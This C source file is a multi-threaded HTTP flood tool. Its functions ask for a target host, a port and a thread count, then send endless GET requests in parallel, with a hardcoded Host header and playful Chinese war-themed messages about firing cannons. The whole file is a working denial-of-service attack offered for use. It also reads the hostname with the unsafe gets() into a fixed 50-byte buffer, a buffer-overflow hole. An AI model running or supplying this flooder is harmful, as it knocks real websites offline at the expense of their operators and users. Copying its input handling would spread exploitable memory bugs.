//标准io
#include <stdio.h>
//线程
#include <pthread.h>
//read,write,close等文件操作在此定义
#include <unistd.h>
//一切皆socket
#include <sys/socket.h>
//错误errno
#include <errno.h>
//IPPROTO_TCP常量在此定义
#include <netinet/in.h>
//inet_addr()在此定义
#include <arpa/inet.h>
//gethostbyname()在此定义
#include <netdb.h>
//memcpy()在此定义
#include <string.h>
struct site{
  char *header;
  char hostname[50];
  struct sockaddr_in *addr_in;
};
void *attack(void *_site)
{
  struct site site=*(struct site*)_site;
  while(1){
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock,(struct sockaddr*)site.addr_in,sizeof(*(site.addr_in)));
    write(sock,site.header,strlen(site.header));
    char put[100];
    read(sock,put,100);   
    if(strstr(put,"HTTP") == NULL){
      puts("炮弹打偏*1");
    }
    
    close(sock);
  }
}
int main()
{
  struct site site;
  site.header="GET / HTTP/1.1\r\n"
                "Host: s1.mcter.cn\r\n"
                "Connection: keep-alive\r\n"
                "Accept: */*\r\n"
                "Connection: close\r\n"
                "\r\n";
  printf("瞄准方向: ");
  gets(site.hostname);
  //puts(s);
  struct sockaddr_in addr_in;
  /*
  以下两个函数用于二进制地址格式和点分十进制字符串格式之间相互转换，但是这两个函数仅仅支持IPv4。
       in_addr_t inet_addr(const char *cp);
       char *inet_ntoa(struct in_addr in);
功能相似的两个函数同时支持IPv4和IPv6
       const char *inet_ntop(int domain, const void *addr, char *str, socklen_t size);
       int inet_pton(int domain, const char *str, void *addr);
  */
  addr_in.sin_family = AF_INET; /* 主机字节序 */
  printf("瞄准目标: ");
  unsigned short port;
  scanf("%hd",&port);
  addr_in.sin_port=htons(port);
  struct hostent *hp;
  hp = gethostbyname(site.hostname);
  memcpy(&addr_in.sin_addr.s_addr, hp->h_addr_list[0], (size_t)hp->h_length);
  site.addr_in=&addr_in;
  //inet_addr("");
  //gethostbyname("s1.mcter.cn")->h_addr;
  //int i;
  //char reponse[4096];
  //puts(site.header);
  printf("钦点炮数: ");
    int th = 1;
  scanf("%d",&th);
  pthread_t attacker[th];
  int a;
  puts("准备开战\n二营长你的意大利炮呢!?");
  sleep(2);
  for(a=0;a<th;a++){
    int pid=pthread_create(&(attacker[a]),NULL,&attack,(void*)&site);
    printf("超电磁炮%d号准备就绪!\n",a+1);
  }
  puts("在这呢，开炮!!!");
  for(a=0;a<th;a++){
    pthread_join(attacker[a],NULL);
  }
  /*
  read(sock,&reponse,sizeof(reponse)/sizeof(char));
  puts(reponse);
  */
  return 0;
}